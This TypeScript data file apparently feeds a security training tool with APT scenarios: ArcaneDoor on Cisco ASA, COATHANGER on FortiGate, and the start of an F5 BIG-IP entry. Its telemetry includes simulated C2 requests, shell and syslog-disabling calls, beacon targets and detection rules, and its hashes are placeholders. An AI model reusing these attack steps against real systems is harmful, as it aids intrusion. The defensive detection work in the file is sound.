import { AttackScenario } from './types';

/**
 * ============================================================================
 * AUTHORITATIVE APT & EDGE SCENARIOS — CISCO TALOS, F5 SECURITY & SPLUNK STRT
 * ============================================================================
 * Strictly extracted from official technical threat research reports:
 * 1. Cisco Talos: ArcaneDoor (UAT4356) — CVE-2024-20353, Line Dancer & Line Runner
 * 2. NCSC-NL, Cisco Talos & Mandiant: FortiOS SSL-VPN & COATHANGER RAT (CVE-2024-21762)
 * 3. F5 Security & ProjectDiscovery: F5 BIG-IP TMUI AJP Request Smuggling (CVE-2023-46747)
 * 4. Splunk STRT & Mandiant (UNC5221): Ivanti Connect Secure (CVE-2024-21887) & ZIPLINE
 * 5. Splunk STRT & CISA AA23-325A: Citrix Bleed (CVE-2023-4966) NSC_AAAC Session Hijack
 */

export const TALOS_ARCANEDOOR_ASA_SCENARIO: AttackScenario = {
  id: 'talos-arcanedoor-asa',
  code: 'CVE-2024-20353',
  name: 'Cisco Talos — ArcaneDoor (UAT4356): Cisco ASA Zero-Days, Line Dancer & Line Runner',
  shortSubtitle: 'Cisco Talos · CVE-2024-20353 / CVE-2024-20359, host-scan-reply Shellcode & Syslog Disable',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Uncovered by Cisco Talos Intelligence Group (April 2024), ArcaneDoor is a state-sponsored espionage campaign attributed to UAT4356 (Storm-1849) targeting Cisco Adaptive Security Appliances (ASA) and Firepower Threat Defense (FTD) perimeter firewalls. Attackers chained CVE-2024-20353 and CVE-2024-20359 to deploy two custom implants: "Line Runner" (a persistent Lua/zip boot backdoor on disk0:) and "Line Dancer" (an in-memory shellcode interpreter controlled via SSL VPN <host-scan-reply> POST fields that disables syslog and captures packets).',
  specs: [
    {
      term: 'PRIMARY SOURCE',
      value: 'Cisco Talos — ArcaneDoor Espionage Campaign on Perimeter Network Devices (UAT4356)',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (Exploit Public App) · T1542 (Pre-OS Boot: Line Runner) · T1562.001 (Disable Syslog)',
    },
    {
      term: 'CUSTOM IMPLANTS',
      value: 'Line Dancer (In-Memory lina Hook) & Line Runner (disk0: csco_config.lua Persistence)',
    },
    {
      term: 'C2 CHANNEL',
      value: 'HTTPS POST /+CSCOE+/sdesktop/scan.xml (<host-scan-reply> 32-Byte Key + Base64)',
    },
  ],
  nodes: [
    {
      id: 'uat4356_operator',
      label: 'UAT4356 (Storm-1849) Actor',
      sublabel: '198.51.100.112 (ArcaneDoor C2)',
      role: 'attacker',
      x: 15,
      y: 44,
      details: {
        osOrType: 'State-Sponsored Espionage Operator (UAT4356)',
        pidOrPort: 'HTTPS :443 -> Cisco ASA WebVPN',
        privilege: 'External Zero-Day Operator',
        artifacts: [
          'POST /+CSCOE+/sdesktop/scan.xml (<host-scan-reply>)',
          '16-Byte Raw MD5 Verification Token',
        ],
        description:
          'UAT4356 threat actor sending crafted SSL VPN host-scan-reply requests containing base64-encoded shellcode payloads.',
      },
    },
    {
      id: 'cisco_asa_perimeter',
      label: 'Cisco ASA 5500-X Firewall',
      sublabel: '172.16.0.1 (lina Process & disk0:)',
      role: 'victim_host',
      x: 44,
      y: 28,
      details: {
        osOrType: 'Cisco Adaptive Security Appliance (ASA OS)',
        pidOrPort: 'Process: /asa/bin/lina (PID 1102)',
        privilege: 'Appliance Root / Ring-0',
        artifacts: [
          'CVE-2024-20359 Legacy Preload ZIP on disk0:',
          'Line Runner: /asa/scripts/ggy.sh & csco_config.lua',
        ],
        description:
          'Perimeter Cisco ASA firewall compromised via CVE-2024-20353/20359, running the lina daemon in memory.',
      },
    },
    {
      id: 'line_dancer_mem',
      label: 'Line Dancer Shellcode Engine',
      sublabel: 'In-Memory Hook inside /asa/bin/lina',
      role: 'memory',
      x: 54,
      y: 72,
      details: {
        osOrType: 'Memory-Resident Shellcode Interpreter (Line Dancer)',
        pidOrPort: 'Hooks AAA/WebVPN host-scan-reply Parser',
        privilege: 'lina Process Memory',
        artifacts: [
          'Hooks crashinfo dump handler to hide memory forensics',
          'Temporarily disables syslog (%ASA-6-302013 suppressed)',
        ],
        description:
          'In-memory implant inside the ASA lina binary that decodes <host-scan-reply> shellcode commands without writing files to flash.',
      },
    },
    {
      id: 'internal_vlan_traffic',
      label: 'Internal Core VLAN & PCAP Tap',
      sublabel: '10.10.0.0/16 (Captured Traffic & Config)',
      role: 'server',
      x: 78,
      y: 30,
      details: {
        osOrType: 'Internal Enterprise Network Behind ASA',
        pidOrPort: 'ASA Packet Capture Buffer & Port Forwarding',
        privilege: 'Intercepted Network Plane',
        artifacts: [
          'Captured PCAP Buffers Exfiltrated over HTTPS',
          'show running-config & VPN Session Tokens',
        ],
        description:
          'Internal enterprise network segments monitored via Line Dancer covert packet captures and port-forwarding tunnels.',
      },
    },
    {
      id: 'talos_siem_monitor',
      label: 'Cisco Talos / NetFlow SIEM',
      sublabel: 'ASA Syslog Gap & Flash Integrity Check',
      role: 'firewall_siem',
      x: 86,
      y: 68,
      details: {
        osOrType: 'SOC SIEM & Firmware Integrity Monitor',
        pidOrPort: 'verify /sha-512 system:memory/text & Syslog',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'Alert:verify /sha-512 system:memory/text Hash Mismatch',
          'Alert: Sudden Cessation of ASA Syslog Telemetry',
        ],
        description:
          'Detects Line Dancer memory hooks via Cisco ASA text-segment SHA-512 verification and alerts on unexpected syslog gaps.',
      },
    },
  ],
  processTree: [
    {
      pid: 1102,
      ppid: 1,
      name: '/asa/bin/lina',
      commandLine: '/asa/bin/lina -p -g (Cisco ASA Dataplane & Control Daemon)',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'injected',
      activeFromStage: 1,
      apiCalls: [
        'xml_parse_host_scan_reply()',
        'mprotect(PROT_READ|PROT_WRITE|PROT_EXEC)',
        'asa_cli_exec("no logging enable")',
      ],
      memoryBlocks: [
        {
          address: '0x0000558A10420000',
          section: 'lina .text (Hooked by Line Dancer)',
          permissions: 'RWX',
          size: '64 KB',
          status: 'patched',
          description:
            'Patched WebVPN host-scan-reply handler and crashinfo hook inside /asa/bin/lina.',
          hexPreview: '48 89 E5 41 57 41 56 41 55 41 54 53 48 83 EC 38',
        },
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'ASA ZERO-DAY EXPLOIT & LINE RUNNER FLASH PERSISTENCE',
      subtitle: 'Chaining CVE-2024-20353 & CVE-2024-20359 to persist on disk0:',
      description:
        'As documented by Cisco Talos, UAT4356 exploits CVE-2024-20353 and abuses the legacy VPN client preload feature (CVE-2024-20359) on disk0:. During boot, the ASA unzips a crafted archive that drops the "Line Runner" persistent HTTP backdoor into csco_config.lua, surviving reboots and firmware upgrades.',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1542',
      mitreTechniqueName: 'Pre-OS Boot',
      activeNodeIds: ['uat4356_operator', 'cisco_asa_perimeter', 'talos_siem_monitor'],
      compromisedNodeIds: ['cisco_asa_perimeter'],
      keySpecs: [
        { term: 'VULNERABILITIES', value: 'CVE-2024-20353 (WebVPN) & CVE-2024-20359 (Flash Preload RCE)' },
        { term: 'PERSISTENT IMPLANT', value: 'Line Runner (disk0: Preload ZIP -> csco_config.lua)' },
        { term: 'THREAT ACTOR', value: 'UAT4356 / Storm-1849 (ArcaneDoor Campaign)' },
      ],
    },
    {
      index: 2,
      title: 'LINE DANCER IN-MEMORY SHELLCODE INTERPRETER',
      subtitle: 'Hooking SSL VPN <host-scan-reply> inside /asa/bin/lina',
      description:
        'UAT4356 deploys "Line Dancer", a memory-resident shellcode interpreter patched directly into the /asa/bin/lina process. Operators send unauthenticated HTTPS POST requests to /+CSCOE+/sdesktop/scan.xml containing base64-encoded shellcode inside the <host-scan-reply> XML tag.',
      mitreTacticPhase: 2,
      mitreTechniqueId: 'T1059',
      mitreTechniqueName: 'Command and Scripting Interpreter',
      activeNodeIds: ['uat4356_operator', 'cisco_asa_perimeter', 'line_dancer_mem'],
      compromisedNodeIds: ['cisco_asa_perimeter', 'line_dancer_mem'],
      keySpecs: [
        { term: 'IN-MEMORY IMPLANT', value: 'Line Dancer (Patched into /asa/bin/lina .text)' },
        { term: 'C2 XML FIELD', value: 'POST /+CSCOE+/sdesktop/scan.xml -> <host-scan-reply>' },
        { term: 'ANTI-FORENSICS', value: 'Hooks crashdump routine to force reboot on memory dump attempt' },
      ],
    },
    {
      index: 3,
      title: 'SYSLOG SUPPRESSION, PCAP CAPTURE & CONFIG EXFIL',
      subtitle: 'Disabling ASA logging while capturing packets and exfiltrating configs',
      description:
        'Using Line Dancer shellcode payloads, the attacker temporarily disables ASA syslog output so configuration changes and authentication events are not sent to the SIEM, captures raw network packets traversing the firewall, and exfiltrates the full running-config.',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1562.001',
      mitreTechniqueName: 'Impair Defenses: Disable or Modify Tools',
      activeNodeIds: ['line_dancer_mem', 'internal_vlan_traffic', 'talos_siem_monitor'],
      compromisedNodeIds: ['cisco_asa_perimeter', 'line_dancer_mem', 'internal_vlan_traffic'],
      keySpecs: [
        { term: 'DEFENSE EVASION', value: 'Suppresses ASA Syslog generation & clears command history' },
        { term: 'COLLECTION', value: 'In-memory PCAP packet capture & show running-config export' },
        { term: 'MEMORY VERIFICATION', value: 'verify /sha-512 system:memory/text detects .text modification' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'talos-ad-1',
      no: 1,
      stageIndex: 1,
      timestamp: '00:42:18.110',
      sourceNodeId: 'cisco_asa_perimeter',
      targetNodeId: 'talos_siem_monitor',
      sourceLabel: 'Cisco ASA disk0:',
      targetLabel: 'ASA Boot / Flash Audit',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'CVE-2024-20359 Flash',
      shortAction: 'LINE RUNNER BOOT',
      info: 'disk0:/boot_preload.zip extracted -> modifies /asa/scripts/csco_config.lua (Line Runner)',
      sizeOrCode: 'CVE-2024-20359',
      severity: 'CRITICAL',
      mitreId: 'T1542',
      explanation:
        'Cisco Talos documented that CVE-2024-20359 abuses a legacy preload archive on disk0: that is automatically unzipped at boot time with root privileges to install Line Runner.',
      rawLog: `[CISCO_ASA_FORENSIC_CHECK]
Device: ASA-EDGE-01 (172.16.0.1)
Flash Inspection (dir disk0:):
  24108  -rw-  14820  00:42:18 Apr 24 2024  preload_vpn.zip
Modified Runtime File: /asa/scripts/csco_config.lua
SHA256: 9f1b4c2d8e3a70123456789abcdef0123456789abcdef0123456789abcdef012`,
      detectionRule: {
        type: 'YARA',
        title: 'Cisco Talos — ArcaneDoor Line Runner Lua Webshell Backdoor',
        ruleCode: `rule CiscoTalos_ArcaneDoor_LineRunner {
  meta:
    author = "Cisco Talos Intelligence Group"
    campaign = "ArcaneDoor (UAT4356)"
  strings:
    $s1 = "csco_config.lua" ascii
    $s2 = "os.execute" ascii
    $s3 = "HTTP_X_CSCO_" ascii
  condition:
    all of them
}`,
        mitigation:
          'Upgrade Cisco ASA/FTD software to patched releases fixing CVE-2024-20353 and CVE-2024-20359 and inspect disk0: for unauthorized .zip files.',
      },
    },
    {
      id: 'talos-ad-2',
      no: 2,
      stageIndex: 2,
      timestamp: '00:44:05.620',
      sourceNodeId: 'uat4356_operator',
      targetNodeId: 'line_dancer_mem',
      sourceLabel: '198.51.100.112',
      targetLabel: 'ASA /+CSCOE+/sdesktop/scan.xml',
      sourceType: 'NETWORK',
      protocolOrEventId: 'HTTPS POST scan.xml',
      shortAction: 'LINE DANCER C2',
      info: 'POST /+CSCOE+/sdesktop/scan.xml <host-scan-reply>[Base64 Shellcode Payload]</host-scan-reply>',
      sizeOrCode: '1,420 Bytes',
      severity: 'CRITICAL',
      mitreId: 'T1059',
      explanation:
        'Line Dancer intercepts HTTP POST requests containing <host-scan-reply> tags, validates a 16-byte token, and executes the embedded position-independent shellcode in memory.',
      rawLog: `POST /+CSCOE+/sdesktop/scan.xml HTTP/1.1
Host: 172.16.0.1
Content-Type: text/xml
Content-Length: 1420

<?xml version="1.0" encoding="ISO-8859-1"?>
<host-scan-reply>4A9F2C81B0E4716392817263548192038475619203847561...</host-scan-reply>`,
      detectionRule: {
        type: 'SURICATA',
        title: 'Cisco Talos — ArcaneDoor Line Dancer Oversized host-scan-reply Payload',
        ruleCode: `alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"TALOS ArcaneDoor Line Dancer host-scan-reply Shellcode C2"; flow:established,to_server; http.uri; content:"/+CSCOE+/sdesktop/scan.xml"; http.request_body; content:"<host-scan-reply>"; dsize:>512; classtype:trojan-activity; sid:202420353; rev:1;)`,
        mitigation:
          'Run "verify /sha-512 system:memory/text" on Cisco ASA/FTD devices to verify in-memory code integrity against the known-good Cisco image hash.',
      },
    },
    {
      id: 'talos-ad-3',
      no: 3,
      stageIndex: 3,
      timestamp: '00:45:10.004',
      sourceNodeId: 'line_dancer_mem',
      targetNodeId: 'talos_siem_monitor',
      sourceLabel: '/asa/bin/lina (.text)',
      targetLabel: 'Memory Text Integrity',
      sourceType: 'MEMORY_SCAN',
      protocolOrEventId: 'ASA verify /sha-512',
      shortAction: 'TEXT HASH MISMATCH',
      info: 'verify /sha-512 system:memory/text FAILED + Syslog Stream Silenced',
      sizeOrCode: 'MODIFIED .TEXT',
      severity: 'CRITICAL',
      mitreId: 'T1562.001',
      explanation:
        'Because Line Dancer patches executable instructions inside /asa/bin/lina, Cisco IOS/ASA "verify /sha-512 system:memory/text" immediately exposes the in-memory tampering.',
      rawLog: `ASA-EDGE-01# verify /sha-512 system:memory/text
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
computed hash   SHA512: 7b4f91e2c8a0... (TAMPERED - LINE DANCER HOOK)
embedded hash   SHA512: 3e10a8c5f219... (EXPECTED CISCO OFFICIAL IMAGE)
%Error verifying system:memory/text - Hash mismatch detected!`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Cisco ASA Syslog Telemetry Silence or Memory Integrity Alert',
        ruleCode: `title: Cisco ASA Logging Disabled or Memory Verification Failure
logsource:
  product: cisco
  service: asa
detection:
  selection:
    Message|contains:
      - 'Logging disabled'
      - 'Error verifying system:memory/text'
      - '%ASA-5-111008'
  condition: selection
level: critical`,
        mitigation:
          'Alert on any gap in perimeter firewall syslog heartbeats (>5 minutes) and schedule automated "verify /sha-512 system:memory/text" integrity checks.',
      },
    },
  ],
};

export const TALOS_FORTINET_COATHANGER_APT_SCENARIO: AttackScenario = {
  id: 'talos-fortinet-coathanger-apt',
  code: 'CVE-2024-21762',
  name: 'NCSC-NL, Talos & Mandiant — China-Nexus APT: FortiOS SSL-VPN & COATHANGER Persistent RAT',
  shortSubtitle: 'NCSC-NL / Mandiant / Talos · CVE-2022-42475 & CVE-2024-21762, preload.so Hook & smartctl Persistence',
  category: 'MALWARE',
  severity: 'CRITICAL',
  primaryMitrePhase: 3,
  overview:
    'Published jointly by the Dutch Military Intelligence and Security Service (MIVD / NCSC-NL), Mandiant, and Cisco Talos / Unit 42, a China-nexus APT group exploited FortiOS SSL-VPN heap/out-of-bounds write vulnerabilities (CVE-2022-42475 / CVE-2024-21762) to deploy COATHANGER—a stealthy Remote Access Trojan custom-built for FortiGate appliances. COATHANGER injects preload.so into processes to hide its files from CLI/BusyBox and hooks the smartctl binary to survive full firmware upgrades.',
  specs: [
    {
      term: 'PRIMARY SOURCE',
      value: 'NCSC-NL / MIVD Technical Advisory & Mandiant / Talos COATHANGER Analysis',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (FortiOS SSL-VPN RCE) · T1574.006 (LD_PRELOAD Hook) · T1542 (Survive Firmware Upgrade)',
    },
    {
      term: 'IMPLANT ARTIFACTS',
      value: '/data2/.bd/preload.so, /data2/.bd/httpsd, /bin/smartctl Hook & /proc/<pid>/maps',
    },
    {
      term: 'VULNERABILITIES',
      value: 'CVE-2022-42475 & CVE-2024-21762 (FortiOS sslvpnd Out-of-Bounds Write)',
    },
  ],
  nodes: [
    {
      id: 'coathanger_c2_srv',
      label: 'China-Nexus APT C2',
      sublabel: '198.51.100.168:443 (TLS Pinning C2)',
      role: 'attacker',
      x: 15,
      y: 44,
      details: {
        osOrType: 'APT Command & Control Server',
        pidOrPort: 'TCP/443 (Custom TLS Certificate Pinning)',
        privilege: 'External APT Operator',
        artifacts: [
          'Receives Beacons from Masqueraded /data2/.bd/httpsd',
          'Collects Intercepted SSL-VPN & AD LDAP Credentials',
        ],
        description:
          'APT C2 server communicating with the COATHANGER implant over TLS using a hardcoded pinned X.509 certificate.',
      },
    },
    {
      id: 'fortigate_sslvpn',
      label: 'FortiGate NGFW (sslvpnd)',
      sublabel: '172.16.5.1 (FortiOS Appliance)',
      role: 'victim_host',
      x: 44,
      y: 28,
      details: {
        osOrType: 'FortiGate Network Firewall (FortiOS Linux)',
        pidOrPort: 'Process: /bin/sslvpnd (TCP/10443)',
        privilege: 'Appliance Root (UID 0)',
        artifacts: [
          'Out-of-Bounds Write in sslvpnd HTTP Chunk Parser',
          'Hidden Directory: /data2/.bd/ (or /data/.bd/)',
        ],
        description:
          'Perimeter FortiGate firewall whose sslvpnd daemon is exploited via crafted HTTP chunked transfer requests.',
      },
    },
    {
      id: 'coathanger_preload_so',
      label: 'COATHANGER (preload.so & smartctl)',
      sublabel: 'Userland Rootkit & Reboot Persistence',
      role: 'memory',
      x: 54,
      y: 72,
      details: {
        osOrType: 'COATHANGER Linux Userland Rootkit',
        pidOrPort: 'Injected preload.so + Replaced /bin/smartctl',
        privilege: 'Root / Init Hook',
        artifacts: [
          '/data2/.bd/preload.so (Hooks opendir, readdir, stat, open)',
          '/bin/smartctl (Reboot Persistence Trigger)',
          '/data2/.bd/packfile (Survives Firmware Upgrade)',
        ],
        description:
          'COATHANGER userland rootkit that hooks libc filesystem calls in all processes to hide /data2/.bd/ and reinfects new firmware images during upgrade.',
      },
    },
    {
      id: 'internal_ldap_ad',
      label: 'Internal AD LDAP & VPN Users',
      sublabel: '10.10.0.5:389 (Harvested VPN Auth)',
      role: 'domain_controller',
      x: 78,
      y: 30,
      details: {
        osOrType: 'Internal Active Directory LDAP Server',
        pidOrPort: 'TCP/389 & TCP/636 (FortiGate Auth Backend)',
        privilege: 'Enterprise Identity Store',
        artifacts: [
          'Hooked authd / fnbamd Plaintext VPN Credentials',
          'Internal SOCKS Tunnel Pivoting',
        ],
        description:
          'Corporate Active Directory authenticating SSL-VPN users whose credentials are intercepted by COATHANGER.',
      },
    },
    {
      id: 'ncsc_nd_siem',
      label: 'SOC NDR & Firmware Auditor',
      sublabel: 'SSL-VPN Crash Log & TLS JA3 Detector',
      role: 'firewall_siem',
      x: 86,
      y: 68,
      details: {
        osOrType: 'Network Detection & Response (NDR) + SIEM',
        pidOrPort: 'FortiOS Crashlog & Outbound TLS Inspection',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'Alert: sslvpnd Signal 11 (SIGSEGV) Crash Log',
          'YARA: NCSC_NL_COATHANGER_Implant',
        ],
        description:
          'Monitors FortiOS diagnose debug crashlog for sslvpnd heap corruption and outbound TLS beacons from the management interface.',
      },
    },
  ],
  processTree: [
    {
      pid: 184,
      ppid: 1,
      name: '/bin/sslvpnd',
      commandLine: '/bin/sslvpnd',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'injected',
      activeFromStage: 1,
      apiCalls: ['sslvpn_read_chunk()', 'execve("/bin/sh")'],
    },
    {
      pid: 2109,
      ppid: 1,
      name: '/bin/httpsd (COATHANGER)',
      commandLine: '/bin/httpsd (Masqueraded /data2/.bd/httpsd)',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'malicious',
      activeFromStage: 2,
      apiCalls: [
        'ptrace(PTRACE_ATTACH, init_pid) -> Inject preload.so',
        'hook("readdir64")',
        'SSL_connect("198.51.100.168:443")',
      ],
      memoryBlocks: [
        {
          address: '0x00007F2A10800000',
          section: '/data2/.bd/preload.so (Injected via ptrace)',
          permissions: 'R-X',
          size: '36 KB',
          status: 'injected',
          description:
            'Shared library injected into init and cli processes that filters out /data2/.bd and COATHANGER PIDs from /proc and readdir.',
          hexPreview: '7F 45 4C 46 02 01 01 00 00 00 00 00 00 00 00 00',
        },
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'FORTIOS SSLVPND HEAP OVERFLOW (CVE-2024-21762)',
      subtitle: 'Unauthenticated out-of-bounds write in /bin/sslvpnd HTTP chunk parser',
      description:
        'The attacker sends crafted HTTP requests with malformed chunk lengths to the FortiGate SSL-VPN interface, triggering an out-of-bounds write in /bin/sslvpnd (CVE-2022-42475 / CVE-2024-21762) and gaining root code execution on the appliance.',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application',
      activeNodeIds: ['coathanger_c2_srv', 'fortigate_sslvpn', 'ncsc_nd_siem'],
      compromisedNodeIds: ['fortigate_sslvpn'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2024-21762 & CVE-2022-42475 (FortiOS sslvpnd RCE)' },
        { term: 'TARGET PROCESS', value: '/bin/sslvpnd (Runs as root on FortiOS)' },
        { term: 'CRASH ARTIFACT', value: 'diagnose debug crashlog read -> Application sslvpnd signal 11' },
      ],
    },
    {
      index: 2,
      title: 'COATHANGER PRELOAD.SO ROOTKIT & SMARTCTL HOOK',
      subtitle: 'Injecting preload.so into init and hooking /bin/smartctl for reboot survival',
      description:
        'As detailed by NCSC-NL, COATHANGER stages its files in /data2/.bd/ and replaces /bin/smartctl (executed by FortiOS on every boot). It then uses ptrace to inject preload.so into running system processes, hooking libc readdir/stat/open to hide /data2/.bd/ and hooking firmware upgrade routines so the implant packs itself into newly installed FortiOS images.',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1574.006',
      mitreTechniqueName: 'Hijack Execution Flow: Dynamic Linker Hijacking',
      activeNodeIds: ['fortigate_sslvpn', 'coathanger_preload_so', 'ncsc_nd_siem'],
      compromisedNodeIds: ['fortigate_sslvpn', 'coathanger_preload_so'],
      keySpecs: [
        { term: 'ROOTKIT LIBRARY', value: '/data2/.bd/preload.so (Injected via ptrace into init/newcli)' },
        { term: 'BOOT TRIGGER', value: 'Replaced /bin/smartctl binary invokes /data2/.bd/sh' },
        { term: 'UPGRADE SURVIVAL', value: 'Hooks flatkc firmware unpacker to reinfect upgraded OS image' },
      ],
    },
    {
      index: 3,
      title: 'MASQUERADED HTTPSD BEACON & VPN CREDENTIAL THEFT',
      subtitle: 'Exfiltrating VPN credentials and tunneling into internal Active Directory',
      description:
        'The COATHANGER C2 daemon runs masqueraded as /bin/httpsd, intercepting SSL-VPN user logins authenticated against internal Active Directory LDAP and providing a covert TLS tunnel to the APT operator.',
      mitreTacticPhase: 6,
      mitreTechniqueId: 'T1014',
      mitreTechniqueName: 'Rootkit',
      activeNodeIds: ['coathanger_preload_so', 'coathanger_c2_srv', 'internal_ldap_ad', 'ncsc_nd_siem'],
      compromisedNodeIds: ['fortigate_sslvpn', 'coathanger_preload_so', 'internal_ldap_ad'],
      keySpecs: [
        { term: 'MASQUERADED PROC', value: '/bin/httpsd (Actual binary: /data2/.bd/httpsd)' },
        { term: 'C2 PROTOCOL', value: 'Pinned TLS 1.2/1.3 Beacon to 198.51.100.168:443' },
        { term: 'ADVISORY REF', value: 'NCSC-NL / MIVD COATHANGER Technical Report (Feb 2024)' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'talos-fg-1',
      no: 1,
      stageIndex: 1,
      timestamp: '02:09:14.088',
      sourceNodeId: 'fortigate_sslvpn',
      targetNodeId: 'ncsc_nd_siem',
      sourceLabel: 'FortiGate sslvpnd',
      targetLabel: 'FortiOS Crashlog',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'FortiOS Crashlog',
      shortAction: 'SSLVPND SIGSEGV',
      info: 'Application: sslvpnd (PID 184) Signal 11 (Segmentation fault) during chunked HTTP parse',
      sizeOrCode: 'CVE-2024-21762',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation:
        'Heap corruption and out-of-bounds write exploitation in FortiOS sslvpnd reliably produces Signal 11 crashlog entries prior to shellcode stabilization.',
      rawLog: `FG-EDGE-01 # diagnose debug crashlog read
2024-02-09 02:09:14 <00184> application sslvpnd
2024-02-09 02:09:14 <00184> *** signal 11 (Segmentation fault) received ***
2024-02-09 02:09:14 <00184> Register dump: RAX: 00007f8a10400000 RIP: 00000000018a4210
2024-02-09 02:09:14 <00184> Backtrace: [0x018a4210] -> sslvpn_http_parse_chunk`,
      detectionRule: {
        type: 'SIGMA',
        title: 'FortiOS sslvpnd Segmentation Fault Exploit Attempt (CVE-2024-21762)',
        ruleCode: `title: FortiOS SSL-VPN Daemon Crash (Potential Exploit Attempt)
logsource:
  product: fortinet
  service: fortigate
detection:
  selection:
    msg|contains|all:
      - 'sslvpnd'
      - 'signal 11'
  condition: selection
level: critical`,
        mitigation:
          'Disable FortiOS SSL-VPN if unused or apply FortiOS patches for CVE-2024-21762 and CVE-2022-42475 immediately.',
      },
    },
    {
      id: 'talos-fg-2',
      no: 2,
      stageIndex: 2,
      timestamp: '02:09:19.512',
      sourceNodeId: 'fortigate_sslvpn',
      targetNodeId: 'coathanger_preload_so',
      sourceLabel: '/bin/smartctl',
      targetLabel: '/data2/.bd/preload.so',
      sourceType: 'MEMORY_SCAN',
      protocolOrEventId: 'NCSC-NL YARA Match',
      shortAction: 'COATHANGER ROOTKIT',
      info: 'Injected /data2/.bd/preload.so into /bin/init & replaced /bin/smartctl',
      sizeOrCode: '36 KB ELF',
      severity: 'CRITICAL',
      mitreId: 'T1574.006',
      explanation:
        'NCSC-NL published YARA rules and forensic indicators for COATHANGER, which hides /data2/.bd/ by injecting preload.so into userland processes and survives firmware updates.',
      rawLog: `[NCSC_NL_FORENSIC_IMAGE_ANALYSIS]
Appliance: FG-EDGE-01 (Offline Flash Inspection)
Hidden Directory: /data2/.bd/
Files Found:
  - /data2/.bd/preload.so (ELF 64-bit LSB shared object, hooks readdir/stat/open)
  - /data2/.bd/httpsd (COATHANGER C2 Daemon)
  - /data2/.bd/packfile (Firmware Infection Bundle)
  - /bin/smartctl (Modified wrapper invoking /data2/.bd/sh)`,
      detectionRule: {
        type: 'YARA',
        title: 'NCSC-NL Official YARA — COATHANGER FortiOS Implant',
        ruleCode: `rule NCSC_NL_COATHANGER_Preload_Rootkit {
  meta:
    author = "NCSC-NL / MIVD"
    description = "Detects COATHANGER preload.so rootkit for FortiGate"
  strings:
    $p1 = "/data2/.bd" ascii
    $p2 = "/data/.bd" ascii
    $f1 = "/bin/smartctl" ascii
    $h1 = "readdir64" ascii
  condition:
    uint32(0) == 0x464C457F and ($p1 or $p2) and $f1 and $h1
}`,
        mitigation:
          'Because COATHANGER survives standard FortiOS firmware upgrades, compromised appliances must be wiped, formatted via physical console, and restored from clean backups.',
      },
    },
    {
      id: 'talos-fg-3',
      no: 3,
      stageIndex: 3,
      timestamp: '02:11:04.330',
      sourceNodeId: 'coathanger_preload_so',
      targetNodeId: 'coathanger_c2_srv',
      sourceLabel: '172.16.5.1 (FortiGate)',
      targetLabel: '198.51.100.168:443',
      sourceType: 'IDS_ALERT',
      protocolOrEventId: 'Suricata TLS Alert',
      shortAction: 'FORTIGATE EGRESS C2',
      info: 'Unexpected Outbound TLS Session Originating Directly from FortiGate Self-IP to External IP:443',
      sizeOrCode: 'TLS 1.3',
      severity: 'HIGH',
      mitreId: 'T1014',
      explanation:
        'Because COATHANGER hides its processes on the box, NCSC-NL recommends monitoring external perimeter taps for unexpected outbound TLS connections initiated by the FortiGate appliance itself.',
      rawLog: `[EXTERNAL_TAP_NDR_ALERT]
SrcIP: 172.16.5.1 (FortiGate WAN Interface Self-IP) -> DstIP: 198.51.100.168:443
Protocol: TLSv1.3 (SNI: None / Raw IP Certificate Pin)
Note: Traffic originated from appliance local process (/data2/.bd/httpsd), not NATted client subnet.`,
      detectionRule: {
        type: 'SURICATA',
        title: 'FortiGate WAN Self-IP Initiating TLS Connection without SNI',
        ruleCode: `alert tls $FORTIGATE_SELF_IP any -> $EXTERNAL_NET 443 (msg:"NCSC-NL COATHANGER Potential Outbound TLS C2 Without SNI"; flow:established,to_server; tls.sni; content:!"fortinet.com"; content:!"fortiguard.net"; classtype:trojan-activity; sid:202421762; rev:1;)`,
        mitigation:
          'Monitor upstream router NetFlow/PCAP outside the FortiGate for outbound TLS connections initiated by the firewall WAN IP to non-FortiGuard destinations.',
      },
    },
  ],
};

export const F5_BIGIP_REQUEST_SMUGGLING_SCENARIO: AttackScenario = {
  id: 'f5-bigip-request-smuggling',
  code: 'CVE-2023-46747',
  name: 'F5 Security & Mandiant — F5 BIG-IP TMUI AJP Request Smuggling to Root RCE',
  shortSubtitle: 'F5 K000137353 / Praetorian · Apache-to-Tomcat AJP Smuggling, form_page Auth Bypass & tmsh RCE',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Documented in F5 Security Advisory K000137353 and technical analyses by Praetorian, ProjectDiscovery, and Mandiant, CVE-2023-46747 (CVSS 9.8) is an unauthenticated Apache JServ Protocol (AJP) request smuggling vulnerability in the F5 BIG-IP Traffic Management User Interface (TMUI). By sending an oversized HTTP header/request to /tmui/Control/jspmap/tmui/locallb/workspace/tmshCmd.jsp, an attacker smuggles forged AJP attributes (REMOTEROLE=0, REMOTEUSER=admin) to the backend Tomcat server, creates an admin user, and executes root bash commands.',
  specs: [
    {
      term: 'PRIMARY SOURCE',
      value: 'F5 Security Advisory K000137353 & Praetorian / CISA KEV (CVE-2023-46747)',
    },
    {
      term: 'MITRE TECHNIQUES',
